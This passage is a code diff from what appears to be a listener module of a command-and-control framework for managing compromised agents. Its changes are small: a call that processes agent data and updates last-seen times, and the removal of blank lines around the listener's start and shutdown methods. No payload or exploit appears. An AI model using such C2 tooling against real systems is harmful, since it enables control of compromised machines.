+                            self.mainMenu.agents.handle_agent_data(staging_key, r.content, listener_options,
+                                                                   update_lastseen=True)
                             message = "[*] Deleting {}/{}".format(results_folder, item['name'])
                             signal = json.dumps({
                                 'print': False,
@@ -799,7 +848,6 @@ class Listener(object):
 
             s.close()
 
-
     def start(self, name=''):
         """
         Start a threaded instance of self.start_server() and store it in the
@@ -821,7 +869,6 @@ class Listener(object):
             # returns True if the listener successfully started, false otherwise
             return self.threads[name].is_alive()
 
-
     def shutdown(self, name=''):
         """
         Terminates the server thread stored in the self.threads dictionary,
@@ -834,4 +881,3 @@ class Listener(object):
         else:
             print(helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value'])))
             self.threads[self.options['Name']['Value']].kill()
-
